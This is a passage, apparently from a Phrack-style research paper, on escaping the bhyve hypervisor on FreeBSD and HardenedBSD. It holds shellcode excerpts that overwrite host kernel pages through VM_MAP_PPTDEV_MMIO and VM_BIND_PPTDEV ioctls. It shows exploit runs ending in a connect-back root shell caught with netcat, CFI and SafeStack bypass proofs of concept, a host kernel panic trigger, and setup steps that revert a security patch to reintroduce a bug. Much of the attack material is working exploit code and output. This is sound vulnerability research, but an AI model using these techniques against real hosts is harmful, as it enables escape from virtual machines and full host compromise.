+VMFS_NO_SPACE. This means the MMIO mapping request will only succeed if
+there is a free region of the requested length at the given guest physical
+address. An ideal address to use would be from a memory range not allocated
+to system memory or PCI devices [15].
+
+The first stage shellcode executing within the sandbox will map the host
+kernel page into the guest and returns control back to the guest OS.
+
+---[ shellcode.c ]---
+. . .
+        payload->mmio.bus  = 2;
+        payload->mmio.slot = 3;
+        payload->mmio.func = 0;
+        payload->mmio.gpa  = gpa_to_host_kernel;
+        payload->mmio.hpa  = sys_cap_enter_phyaddr & 0xFFF000;
+        payload->mmio.len  = getpagesize();
+. . .
+        payload->syscall(SYS_ioctl, VMM_FD, VM_MAP_PPTDEV_MMIO,
+&payload->mmio);
+. . .
+
+The guest OS then maps the guest physical address and writes to it, which
+in turn overwrites the host kernel pages:
+
+---[ exploit.c ]---
+. . .
+        warnx("[+] Mapping GPA pointing to host kernel...");
+        kernel_page = map_phy_address(gpa_to_host_kernel, getpagesize());
+
+        warnx("[+] Overwriting sys_cap_enter in host kernel...");
+        offset_in_page = sys_cap_enter_phyaddr & 0xFFF;
+        memcpy(&kernel_page[offset_in_page], &disable_capability,
+                        (void *)&disable_capability_end - (void
+*)&disable_capability);
+. . .
+
+Finally, the guest triggers the second stage payload to call
+sys_cap_enter() to disable the capability mode. Interestingly, the
+VM_MAP_PPTDEV_MMIO command sandbox escape will work even when an individual
+guest VM is not configured to use PCI passthrough. 
+
+During initialization passthru_init() calls the libvmmapi API
+vm_assign_pptdev() to bind the device:
+
+static int
+passthru_init(struct vmctx *ctx, struct pci_devinst *pi, char *opts)
+{
+        . . .
+        if (vm_assign_pptdev(ctx, bus, slot, func) != 0) {
+        . . .
+}
+
+int
+vm_assign_pptdev(struct vmctx *ctx, int bus, int slot, int func)
+{
+        . . .
+        pptdev.bus = bus;
+        pptdev.slot = slot;
+        pptdev.func = func;
+
+        return (ioctl(ctx->fd, VM_BIND_PPTDEV, &pptdev));
+}
+
+Similarly, payload running in the sandboxed process can bind to a
+passthrough device using VM_BIND_PPTDEV IOCTL command and then use
+VM_MAP_PPTDEV_MMIO command to escape the sandbox. For this to work, some
+PCI device should be configured for passthrough in the loader configuration
+of the host [12] and not owned by any other guest VM. 
+
+---[ shellcode.c ]---
+. . .
+        payload->pptdev.bus  = 2;
+        payload->pptdev.slot = 3;
+        payload->pptdev.func = 0;
+. . .
+        payload->syscall(SYS_ioctl, VMM_FD, VM_BIND_PPTDEV,
+&payload->pptdev);
+        payload->syscall(SYS_ioctl, VMM_FD, VM_MAP_PPTDEV_MMIO,
+&payload->mmio);
+. . .
+
+Running the VM escape exploit with PCI passthrough sandbox escape will give
+the following output:
+
+root@guest:~/setupB/fwctl_sandbox_bind_exploit # ./exploit 192.168.182.144
+6969
+exploit: [+] CPU affinity set to vCPU0
+exploit: [+] Changing state to IDENT_SEND
+exploit: [+] Reading signature...
+exploit: [+] Received signature : BHYV
+exploit: [+] Set req_size value to 0xFFFFFFFF
+exploit: [+] Setting up fake structures...
+exploit: [+] Preparing connect back shellcode for 192.168.182.144:6969
+exploit: [+] Sending data to overwrite IO handlers...
+exploit: [+] Overwriting mmio_hint...
+exploit: [+] Triggering MMIO read to execute sandbox bypass payload...
+exploit: [+] Mapping GPA pointing to host kernel...
+exploit: [+] Overwriting sys_cap_enter in host kernel...
+exploit: [+] Triggering MMIO read to execute connect back payload...
+root@guest:~/setupB/fwctl_sandbox_bind_exploit #
+
+root@guest:~ # nc -vvv -l 6969
+Connection from 192.168.182.143 61608 received!
+id
+uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
+
+It is also possible to trigger a panic() in the host kernel from within the
+sandbox by adding a device twice using VM_BIND_PPTDEV. During the
+VM_BIND_PPTDEV command handling, vtd_add_device() in vmm/intel/vtd.c calls
+panic() if the device is already owned. I did not explore this further as
+it is less interesting for a complete sandbox escape.
+
+static void
+vtd_add_device(void *arg, uint16_t rid)
+{
+        . . .
+        if (ctxp[idx] & VTD_CTX_PRESENT) {
+                panic("vtd_add_device: device %x is already owned by "
+                      "domain %d", rid,
+                      (uint16_t)(ctxp[idx + 1] >> 8));
+        }
+        . . .
+}
+
+---[ core.txt ]---
+. . .
+panic: vtd_add_device: device 218 is already owned by domain 2
+cpuid = 0
+KDB: stack backtrace:
+#0 0xffffffff80b3d567 at kdb_backtrace+0x67
+#1 0xffffffff80af6b07 at vpanic+0x177
+#2 0xffffffff80af6983 at panic+0x43
+#3 0xffffffff8227227c at vtd_add_device+0x9c
+#4 0xffffffff82262d5b at ppt_assign_device+0x25b
+#5 0xffffffff8225da20 at vmmdev_ioctl+0xaf0
+#6 0xffffffff809c49b8 at devfs_ioctl_f+0x128
+#7 0xffffffff80b595ed at kern_ioctl+0x26d
+#8 0xffffffff80b5930c at sys_ioctl+0x15c
+#9 0xffffffff80f79038 at amd64_syscall+0xa38
+#10 0xffffffff80f57eed at fast_syscall_common+0x101
+. . .
+
+--[ 9 - Analysis of CFI and SafeStack in HardenedBSD 12-CURRENT
+
+Bhyve in HardenedBSD 12-CURRENT comes with mitigations like ASLR, PIE,
+clang's Control-Flow Integrity (CFI) [16], SafeStack etc. Addition of
+mitigations created a new set of challenge for exploit development. The
+initial plan was to test against these mitigations using CVE-2018-17160
+[21]. However, turning CVE-2018-17160 into an information disclosure looked
+less feasible during my analysis. To continue the analysis further, I
+reverted the patch for VGA bug (FreeBSD-SA-16:32) [1] for information
+disclosure. Now we have a combination of two bugs, VGA bug to disclose
+bhyve base address and fwctl bug for arbitrary r/w. 
+
+During an indirect call, CFI verifies if the target address points to a
+valid function and has a matching function pointer type. All the details
+mentioned in section 7.2 for achieving arbitrary read and write works even
+under CFI once we know the bhyve base address. The function
+pci_emul_io_handler() used to overwrite the 'handler' in 'inout_handlers'
+structure and functions pci_emul_dior(), pci_emul_diow() used in fake
+'pci_devemu' structure, all have matching function pointer types and does
+not violate CFI rules.
+
+For making indirect function calls, CFI instrumentation generates a jump
+table, which has branch instruction to the actual target function [17]. It
+is this address of jump table entries which are valid targets for CFI and
+should be used when overwriting the callbacks. Symbols to the target
+function are referred to as *.cfi. Since radare2 does a good job in
+analyzing CFI enabled binaries,  jump tables can be located by finding
+references to the symbols *.cfi. 
+
+# r2 /usr/sbin/bhyve
+[0x0001d000]> o /usr/lib/debug/usr/sbin/bhyve.debug
+[0x0001d000]> aaaa
+
+[0x0001d000]> axt sym.pci_emul_diow.cfi
+sym.pci_emul_diow 0x64ca8 [code] jmp sym.pci_emul_diow.cfi
+[0x0001d000]> axt sym.pci_emul_dior.cfi
+sym.pci_emul_dior 0x64c60 [code] jmp sym.pci_emul_dior.cfi
+
+Rest of the section will detail about targets to overwrite when CFI and
+SafeStack are in place. All the previously detailed techniques will no
+longer work. CFI bypasses due to lack of Cross-DSO CFI is out of scope for
+this research. 
+
+----[ 9.1 - SafeStack bypass using neglected pointers
+
+SafeStack [18] protects against stack buffer overflows by separating the
+program stack into two regions - safe stack and unsafe stack. The safe
+stack stores critical data like return addresses, register spills etc.
+which need protection from stack buffer overflows. For protection against
+arbitrary memory writes, SafeStack relies on randomization and information
+hiding. ASLR should be strong enough to prevent an attacker from predicting
+the address of the safe stack, and no pointers to the safe stack should be
+stored outside the safe stack itself. 
+
+However, this is not always the case. There are a lot of neglected pointers
+to the safe stack as already demonstrated in [19]. Bhyve stores pointers to
+stack data in global variables during its initialization in main 'mevent'
+thread. Some of the pointers are 'guest_uuid_str', 'vmname', 'progname' and
+'optarg' in bhyverun.c. Other interesting variables storing pointers to the
+stack are 'environ' and '__progname':  
+
+root@renorobert:~ # gdb -q -p `pidof bhyve`
+Attaching to process 62427
+Reading symbols from /usr/sbin/bhyve...Reading symbols from
+/usr/lib/debug//usr/sbin/bhyve.debug...done.
+done.
+. . .
+(gdb) x/gx &progname 
+0x262fbe9b600 <progname>:	0x00006dacc2a15a40
+
+'mevent' thread also stores a pointer to pthread structure in 'mevent_tid'
+declared in mevent.c:
+
+static pthread_t mevent_tid;
+. . .
+void
+mevent_dispatch(void)
+{
+        . . .
+        mevent_tid = pthread_self();
+        . . .
+}
+
+The arbitrary read primitive created from fwctl bug can disclose the safe
+stack address of 'mevent' thread by reading any of the variables mentioned
+above.
+
+Let's consider the case of 'mevent_tid' pthread structure. The 'pthread'
+and 'pthread_attr' structures are defined in libthr/thread/thr_private.h.
+The useful elements for leaking stack address include 'unwind_stackend',
+'stackaddr_attr' and 'stacksize_attr'. Below is the output of the analysis
+from gdb and procstat:
+
+(gdb) print ((struct pthread *)mevent_tid)->unwind_stackend 
+$3 = (void *) 0x6dacc2a16000
+(gdb) print ((struct pthread *)mevent_tid)->attr.stackaddr_attr 
+$4 = (void *) 0x6dac82a16000
+(gdb) print ((struct pthread *)mevent_tid)->attr.stacksize_attr 
+$5 = 1073741824
+(gdb) print ((struct pthread *)mevent_tid)->attr.stackaddr_attr + ((struct
+pthread *)mevent_tid)->attr.stacksize_attr 
+$6 = (void *) 0x6dacc2a16000
+
+root@renorobert:~ # procstat -v `pidof bhyve`
+. . .
+62427     0x6dac82a15000     0x6dac82a16000 ---    0    0   0   0 ---- -- 
+62427     0x6dac82a16000     0x6dacc29f6000 ---    0    0   0   0 ---- -- 
+62427     0x6dacc29f6000     0x6dacc2a16000 rw-    3    3   1   0 ---D df
+
+Once the safe stack location of 'mevent' thread is leaked, arbitrary write
+can be used to overwrite the return address of any function call.  It is
+also possible to calculate the safe stack address of other threads since
+they are relative to address of 'mevent' thread's safe stack. 
+
+Next, we should find a target function call to overwrite the return
+address. The event dispatcher function mevent_dispatch() (section 3.2) goes
+into an infinite loop, waiting for events using a blocking call to
+kevent():
+
+void
+mevent_dispatch(void)
+{
+        . . .
+        for (;;) {
+                . . .
+                ret = kevent(mfd, NULL, 0, eventlist, MEVENT_MAX, NULL);
+                . . .
+                mevent_handle(eventlist, ret);
+        }
+}
+
+Overwriting the return address of the blocking call to kevent() gives RIP
+control as soon as an event is triggered in bhyve. Below is the output of
+the proof-of-concept code demonstrating RIP control:
+
+root@guest:~/setupC/cfi_safestack_bypass # ./exploit 
+exploit: [+] Triggering info leak using FreeBSD-SA-16:32.bhyve...
+exploit: [+] mevent located @ offset = 0x1df58
+exploit: [+] Leaked power_handler address = 0x262fbc43ae0
+exploit: [+] Bhyve base address = 0x262fbbdf000
+exploit: [+] Changing state to IDENT_SEND
+exploit: [+] Reading signature...
+exploit: [+] Received signature : BHYV
+exploit: [+] Set req_size value to 0xFFFFFFFF
+exploit: [+] Setting up fake structures...
+exploit: [+] Sending data to overwrite IO handlers...
+exploit: [+] Leaking safe stack address by reading pthread struct...
+exploit: [+] Leaked safe stack address = 0x6dacc2a16000
+exploit: [+] Located mevent_dispatch RIP...
+
+root@renorobert:~ # gdb -q -p `pidof bhyve`
+Attaching to process 62427
+Reading symbols from /usr/sbin/bhyve...Reading symbols from
+/usr/lib/debug//usr/sbin/bhyve.debug...done.
+done.
+. . .
+[Switching to LWP 100082 of process 62427]
+_kevent () at _kevent.S:3
+3	_kevent.S: No such file or directory.
+(gdb) c
+Continuing.
+
+Thread 1 "mevent" received signal SIGBUS, Bus error.
+0x000002e5ed0984f8 in __thr_kevent (kq=<optimized out>,
+changelist=<optimized out>, nchanges=<optimized out>, eventlist=<optimized
+out>, nevents=<optimized out>, 
+    timeout=0x6dacc2a15700) at
+/usr/src/lib/libthr/thread/thr_syscalls.c:403
+403	}
+(gdb) x/i $rip
+=> 0x2e5ed0984f8 <__thr_kevent+120>:	retq   
+(gdb) x/gx $rsp
+0x6dacc2a156d8:	0xdeadbeef00000000
+
+----[ 9.2 - Registering arbitrary signal handler using ACPI shutdown
+
+For the next bypass, let's revisit the smi_cmd_handler() detailed in
+section 3.2. Writing the value 0xa1 (BHYVE_ACPI_DISABLE) to SMI command
+port not only removes the event handler for SIGTERM, but also registers a
+signal handler.
+
+static sig_t old_power_handler;
+. . .
+static int
+smi_cmd_handler(struct vmctx *ctx, int vcpu, int in, int port, int bytes,
+    uint32_t *eax, void *arg)
+{
+        . . .
+        case BHYVE_ACPI_DISABLE:
+                . . .
+                if (power_button != NULL) {
+                        mevent_delete(power_button);
+                        power_button = NULL;
+                        signal(SIGTERM, old_power_handler);
+        . . .
+}
+
+'old_power_handler' can be overwritten using the arbitrary write provided
+by fwctl bug. The call to signal() thus uses the overwritten value,
+allowing the guest to register an arbitrary address as a signal handler for
+SIGTERM signal. The plan is to invoke the arbitrary address through the
+signal trampoline which does not perform CFI validations. The signal
+trampoline code invokes the signal handler and then invokes sigreturn
+system call to restore the thread's state:
+
+   0x7fe555aba000:	callq  *(%rsp)
+   0x7fe555aba003:	lea    0x10(%rsp),%rdi
+   0x7fe555aba008:	pushq  $0x0
+   0x7fe555aba00a:	mov    $0x1a1,%rax
+   0x7fe555aba011:	syscall
+
+However, call to signal() does not directly invoke the sigaction system
+call. The libthr library on load installs interposing handlers [20] for
+many functions in libc, including sigaction().
+
+int
+sigaction(int sig, const struct sigaction *act, struct sigaction *oact)
+{
+        return (((int (*)(int, const struct sigaction *, struct sigaction
+*))
+            __libc_interposing[INTERPOS_sigaction])(sig, act, oact));
+}
+
+The libthr signal handling code is implemented in libthr/thread/thr_sig.c.
+The interposing function __thr_sigaction() stores application registered
+signal handling information in an array '_thr_sigact[_SIG_MAXSIG]'. libthr
+also registers a single signal handler thr_sighandler(), which dispatches
+to application registered signal handlers using the information stored in
+'_thr_sigact'. When a signal is received, thr_sighandler() calls
+handle_signal() to invoke the respective signal handler through an indirect
+call.
+
+static void
+handle_signal(struct sigaction *actp, int sig, siginfo_t *info, ucontext_t
+*ucp)
+{
+        . . .
+        sigfunc = actp->sa_sigaction;
+        . . .
+        if ((actp->sa_flags & SA_SIGINFO) != 0) {
+                sigfunc(sig, info, ucp);
+        } else {
+                ((ohandler)sigfunc)(sig, info->si_code,
+                    (struct sigcontext *)ucp, info->si_addr,
+                    (__sighandler_t *)sigfunc);
+        }
+        . . .
+} 
+
+If libthr.so is compiled with CFI, these indirect calls will also be
+protected. In order to redirect execution to the signal trampoline, guest
+should overwrite the __libc_interposing[INTERPOS_sigaction] entry with
+address of  _sigaction() system call instead of  __thr_sigaction(). Since
+_sigaction() and __thr_sigaction() are of the same function type, they
+should be valid targets under CFI. 
+
+After the guest registers a fake signal handler, it should wait until the
+host triggers an ACPI shutdown using SIGTERM. Below is the output of
+proof-of-concept for RIP control using signal handler: 
+
+root@guest:~/setupC/cfi_signal_bypass # ./exploit 
+exploit: [+] Triggering info leak using FreeBSD-SA-16:32.bhyve...
+exploit: [+] mevent located @ offset = 0xbff58
+exploit: [+] Leaked power_handler address = 0x2aa1604cae0
+exploit: [+] Bhyve base address = 0x2aa15fe8000
+exploit: [+] Changing state to IDENT_SEND
+exploit: [+] Reading signature...
+exploit: [+] Received signature : BHYV
+exploit: [+] Set req_size value to 0xFFFFFFFF
+exploit: [+] Setting up fake structures...
+exploit: [+] Sending data to overwrite IO handlers...
+exploit: [+] libc base address = 0x6892a57a000
+exploit: [+] Overwriting libc interposing table entry for sigaction...
+exploit: [+] Overwriting old_power_handler...
+exploit: [+] Disabling ACPI shutdown to register fake signal handler
+root@guest:~/cfi_bypass/cfi_signal_bypass #
+
+root@host:~ # vm stop freebsdvm
+Sending ACPI shutdown to freebsdvm
+
+root@host:~ # gdb -q -p `pidof bhyve`
+Attaching to process 44443
+Reading symbols from /usr/sbin/bhyve...Reading symbols from
+/usr/lib/debug//usr/sbin/bhyve.debug...done.
+done.
+ . . .
+_kevent () at _kevent.S:3
+3	_kevent.S: No such file or directory.
+(gdb) c
+Continuing.
+
+Thread 1 "mevent" received signal SIGTERM, Terminated.
+_kevent () at _kevent.S:3
+3	in _kevent.S
+(gdb) c
+Continuing.
+
+Thread 1 "mevent" received signal SIGBUS, Bus error.
+0x00007fe555aba000 in '' ()
+(gdb) x/i $rip
+=> 0x7fe555aba000:	callq  *(%rsp)
+(gdb) x/gx $rsp
+0x751bcf604b70:	0xdeadbeef00000000
+
+The information disclosure using FreeBSD-SA-16:32.bhyve crashes at times in
+HardenedBSD 12-Current. Though this can be improved, I left it as such
+since the bug was re-introduced for experimental purposes by reverting the
+patch.
+
+--[ 10 - Conclusion 
+
+The paper details various techniques to gain RIP control as well as achieve
+arbitrary read/write by abusing bhyve's internal data structures. I believe
+the methodology described here is generic and could be applicable in the
+exploitation of similar bugs in bhyve or even in the analysis of other
+hypervisors.
+
+Many thanks to Ilja van Sprundel for finding and disclosing the VGA bug
+detailed in the first part of the paper. Thanks to argp, huku and vats for
+their excellent research on the jemalloc allocator exploitation. I would
+also like to thank Mehdi Talbi and Paul Fariello for their QEMU case study
+paper, which motivated me to write one for bhyve. Finally a big thanks to
+Phrack Staff for their review and feedback, which helped me improve the
+article. 
+
+--[ 11 - References
+
+[1] FreeBSD-SA-16:32.bhyve  - privilege escalation vulnerability
+https://www.freebsd.org/security/advisories/FreeBSD-SA-16:32.bhyve.asc
+[2] Setting the VGA Palette
+https://bos.asmhackers.net/docs/vga_without_bios/docs/palettesetting.pdf
+[3] Hardware Level VGA and SVGA Video Programming Information Page
+http://www.osdever.net/FreeVGA/vga/colorreg.htm
+[4] Pseudomonarchia jemallocum
+http://phrack.org/issues/68/10.html
+[5] Exploiting VLC, a case study on jemalloc heap overflows
+http://phrack.org/issues/68/13.html
+[6] The Shadow over Android
+https://census-labs.com/media/shadow-infiltrate-2017.pdf
+[7] Kqueue: A generic and scalable event notification facility
+https://people.freebsd.org/~jlemon/papers/kqueue.pdf
+[8] VM escape - QEMU Case Study 
+http://www.phrack.org/papers/vm-escape-qemu-case-study.html
+[9] Capsicum: practical capabilities for UNIX
+https://www.usenix.org/legacy/event/sec10/tech/full_papers/Watson.pdf
+[10] Capsicumise bhyve
+https://reviews.freebsd.org/D8290
+[11] Capsicum support for bhyve
+https://reviews.freebsd.org/rS313727
+[12] bhyve PCI Passthrough
+https://wiki.freebsd.org/bhyve/pci_passthru
+[13] Put kernel physaddr at explicit 2MB rather than inconsistent
+MAXPAGESIZE
+https://reviews.freebsd.org/D8610
+[14] VM_MAP_FIND - FreeBSD Kernel Developer's Manual
+https://www.freebsd.org/cgi/man.cgi'query=vm_map_find&sektion=9
+[15] Nested Paging in bhyve
+https://people.freebsd.org/~neel/bhyve/bhyve_nested_paging.pdf
+[16] Introducing CFI
+https://hardenedbsd.org/article/shawn-webb/2017-03-02/introducing-cfi
+[17] Control Flow Integrity Design Documentation
+https://clang.llvm.org/docs/ControlFlowIntegrityDesign.html
+[18] SafeStack
+https://clang.llvm.org/docs/SafeStack.html
+[19] Bypassing clang's SafeStack for Fun and Profit
+https://www.blackhat.com/docs/eu-16/materials/eu-16-Goktas-Bypassing-Clangs-SafeStack.pdf
+[20] libthr - POSIX threads library
+https://www.freebsd.org/cgi/man.cgi'query=libthr&sektion=3&manpath=freebsd-release-ports
+[21] FreeBSD-SA-18:14.bhyve - Insufficient bounds checking in bhyve device
+model
+https://www.freebsd.org/security/advisories/FreeBSD-SA-18:14.bhyve.asc
+[22] FreeBSD-SA-18:14.bhyve - Always treat firmware request and response
+sizes as unsigned
+https://github.com/freebsd/freebsd/commit/33c6dca1c4dc75a1d7017b70f388de88636a7e63
+
+--[ 12 - Source code and environment details
+
+The experiment was set up on 3 different host operating systems, all
+running inside VMware Fusion with nested virtualization enabled. vm-bhyve
+[S1] was used to set up and manage the virtual machines
+
+A. FreeBSD 11.0-RELEASE-p1 #0 r306420 running Ubuntu server 14.04.5 LTS as
+   guest
+B. FreeBSD 11.2-RELEASE #0 r335510 running FreeBSD 11.2-RELEASE #0 r335510
+   as guest
+C. FreeBSD 12.0-CURRENT #0 [DEVEL:HardenedBSD-CURRENT-hbsdcontrol-amd64:53]
+   running FreeBSD 11.1-RELEASE #0 r321309
+
+Setup (A): Set graphics="yes" in the VM configuration used by vm-bhyve to
+enable framebuffer device required by VGA. vm-bhyve enables frame buffer
+device only when UEFI is also enabled. This check can be commented out in
+'vm-run' bash script [S2].
+
+# add frame buffer output
+#
+vm::bhyve_device_fbuf(){
+    local _graphics _port _listen _res _wait _pass
+    local _fbuf_conf
+
+    # only works in uefi mode
+    #[ -z "${_uefi}" ] && return 0
+    . . .
+}
+
+All the analysis detailed in section 2, 3, 4 and 5 uses this setup (A). The
+following exploits provided in the attached code can be tested in this
+environment:
+
+- readmemory - proof of concept code to disclose bhyve heap using VGA bug
+  (section 3.1)
+- vga_fakearena_exploit - full working exploit with connect back shellcode
+  using fake arena technique (section 3) 
+- vga_ioport_exploit - full working exploit with connect back shellcode
+  using corrupted inout_handlers structure (section 4.1 - 4.4)
+- vga_pci_exploit - proof of concept code to demonstrate RIP control using
+  PCI BAR decoding technique (section 4.5). It requires libpciaccess, which
+can be installed using 'apt-get install libpciaccess-dev'
+
+Setup (B): Apply the bhyverun.patch in the attached code to bhyve and
+rebuild from source. This enables fwctl device by default without
+specifying a bootrom
+
+# cd /usr/src
+# patch < bhyverun.patch
+# cd /usr/src/usr.sbin/bhyve
+# make 
+# make install
+
+Enable IOMMU if the host is running as a VM. Follow the instructions in
+[S3] up to step 4 to make sure a device available for any VM running on
+this host. I used the below USB device for passthrough:
+
+root@host:~ # pciconf -v -l
+. . .
+ppt0@pci0:2:3:0:	class=0x0c0320 card=0x077015ad chip=0x077015ad
+rev=0x00 hdr=0x00
+    vendor     = 'VMware'
+    device     = 'USB2 EHCI Controller'
+    class      = serial bus
+    subclass   = USB
+
+After the reboot, verify if the device is ready for passthrough:
+
+root@host:~ # vm passthru
+
+DEVICE     BHYVE ID     READY        DESCRIPTION
+hostb0     0/0/0        No           440BX/ZX/DX - 82443BX/ZX/DX Host
+bridge
+pcib1      0/1/0        No           440BX/ZX/DX - 82443BX/ZX/DX AGP bridge
+isab0      0/7/0        No           82371AB/EB/MB PIIX4 ISA 
+. . .
+em0        2/1/0        No           82545EM Gigabit Ethernet Controller
+(Copper)
+pcm0       2/2/0        No           ES1371/ES1373 / Creative Labs CT2518
+ppt0       2/3/0        Yes          USB2 EHCI Controller
+
+The 'USB2 EHCI Controller' is marked ready. After this, set 'passthru0'
+parameter as '2/3/0' in the VM configuration used by vm-bhyve [S4] to
+expose the device to a VM.
+
+All the analysis detailed in section 6, 7 and 8 uses this setup (B). The
+following exploits provided in the attached code can be tested in this
+environment:
+
+- fwctl_sandbox_devmem_exploit - full working exploit with connect back
+  shellcode using /dev/mem sandbox escape. Requires 'passthru0' parameter
+  to be configured
+- fwctl_sandbox_map_exploit - full working exploit with connect back
+  shellcode using VM_MAP_PPTDEV_MMIO IOCTL command. Requires 'passthru0'
+  parameter to be configured
+- fwctl_sandbox_bind_exploit - full working exploit with connect back
+  shellcode using VM_MAP_PPTDEV_MMIO and VM_BIND_PPTDEV IOCTL command.
+  Configure only a host device for passthrough. Do not set the 'passthru0'
+  parameter. If 'passthru0' is set, a kernel panic detailed in section 8
+  will be triggered when running the exploit.
+
+Setup (C): This setup uses
+HardenedBSD-CURRENT-hbsdcontrol-amd64-s201709141755-disc1.iso downloaded
+from [S5]. Use the information provided in [S6] to setup ports if
+necessary. Apply the bhyverun.patch in the attached code and revert the VGA
+patch [S7] from bhyve.
+
+# cd /usr/src
+# patch < bhyverun.patch
+# fetch https://security.FreeBSD.org/patches/SA-16:32/bhyve.patch
+# patch -R < bhyve.patch
+# cd /usr/src/usr.sbin/bhyve
+# make 
+# make install
+
+All the analysis detailed in section 9 uses this setup (C). The following
+proof of concepts provided in the attached code can be tested in this
+environment:
+
+- cfi_safestack_bypass - proof of concept code to demonstrate RIP control
+  bypassing SafeStack    
+- cfi_signal_bypass - proof of concept code to demonstrate RIP control
+  using signal trampoline
+
+Addresses of ROP gadgets might need readjustment in any of the above code.
+
+[S1] vm-bhyve - Management system for FreeBSD bhyve virtual machines
+https://github.com/churchers/vm-bhyve
+[S2] vm-run
+https://github.com/churchers/vm-bhyve/blob/master/lib/vm-run
+[S3] bhyve PCI Passthrough
+https://wiki.freebsd.org/bhyve/pci_passthru
+[S4] passthru0
+https://github.com/churchers/vm-bhyve/blob/master/sample-templates/config.sample
+[S5] HardenedBSD-CURRENT-hbsdcontrol-amd64-LATEST/ISO-IMAGES
+https://jenkins.hardenedbsd.org/builds/HardenedBSD-CURRENT-hbsdcontrol-amd64-LATEST/ISO-IMAGES/
+[S6] How to use Ports under HardenedBSD
+https://groups.google.com/a/hardenedbsd.org/d/msg/users/gRGS6n_446M/KoHGgrB1BgAJ
+[S7] FreeBSD-SA-16:32.bhyve  - privilege escalation vulnerability
+https://www.freebsd.org/security/advisories/FreeBSD-SA-16:32.bhyve.asc 
+
